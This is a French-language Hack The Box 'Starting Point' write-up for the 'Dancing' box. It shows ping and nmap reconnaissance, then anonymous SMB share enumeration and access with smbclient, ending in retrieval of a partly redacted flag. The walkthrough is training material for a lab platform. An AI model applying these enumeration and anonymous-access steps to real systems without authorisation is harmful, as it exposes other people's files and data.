---
title: "Dancing"
date: 2025-12-01
description: "Découverte du protocole SMB et des partages réseaux."
authors: [ravenbreach]
tags: [writeups, hackthebox, starting-point, misconfiguration, windows, tier-0]
slug: dancing
image: ./featured.gif
---

# Introduction

**Dancing** est la troisième box du parcours *Starting Point* de [Hack The Box](https://www.hackthebox.com/). Après avoir vu Telnet et FTP, on s'attaque ici au protocole **SMB**. C'est une machine parfaite pour comprendre comment naviguer dans les partages réseaux Windows.

:::warning
Dans ce writeup, je ne publie pas directement le flag final, l'objectif est d'apprendre en pratiquant.
:::

:::caution
N'attaquez que des machines sur lesquelles vous avez l'autorisation. Respectez les règles de la plateforme.
:::

## Vidéo Walkthrough

<iframe
  width="100%"
  style={{aspectRatio: '16/9'}}
  src="https://www.youtube.com/embed/vWKbqzG_u00"
  title="Dancing Walkthrough"
  frameBorder="0"
  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
  allowFullScreen
/>

---

## Reconaissance

### Découverte d'hôte

```bash
┌─[user@parrot]─[~]
└──╼ $ping 10.129.63.29

64 bytes from 10.129.63.29: icmp_seq=1 ttl=127 time=14.4 ms
```

Le **TTL de 127** confirme souvent qu'on est face à du **Windows**.

### Énumération des services

```bash
┌─[user@parrot]─[~]
└──╼ $nmap -sV 10.129.63.29

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows
```

Le port **445** correspond au service **SMB** (Server Message Block). S'il est mal configuré, il permet de s'y connecter sans mot de passe.

---

## Pré-Exploitation

### Evaluation de vulnérabilité

On liste les partages disponibles avec `smbclient -L` (connexion anonyme, mot de passe vide).

```bash
┌─[user@parrot]─[~]
└──╼ $smbclient -L 10.129.63.29

 Sharename       Type      Comment
 ---------       ----      -------
 ADMIN$          Disk      Remote Admin
 C$              Disk      Default share
 IPC$            IPC       Remote IPC
 WorkShares      Disk
```

**WorkShares** a l'air custom et donc suspect.

---

## Exploitation

### Accès initial

On teste chaque partage. ADMIN$ et C$ refusent l'accès. WorkShares s'ouvre !

```bash
┌─[user@parrot]─[~]
└──╼ $smbclient \\\\10.129.63.29\\WorkShares

smb: \> ls
  Amy.J    D  0  Mon Mar 29 09:08:24 2021
  James.P  D  0  Thu Jun  3 08:38:03 2021
```

### Récupération des données

```bash
smb: \> cd James.P
smb: \James.P\> ls
  flag.txt  A  32  Mon Mar 29 09:26:57 2021

smb: \James.P\> get flag.txt
smb: \> exit
```

### Post-Exploitation

```bash
┌─[user@parrot]─[~]
└──╼ $cat flag.txt

5f6{...}664
```

La machine est **pwned** !

---

## Pour aller plus loin

Script bash de récupération automatique du flag :
[MohamedOutougane/Dancing_Automated](https://github.com/MohamedOutougane/Dancing_Automated)
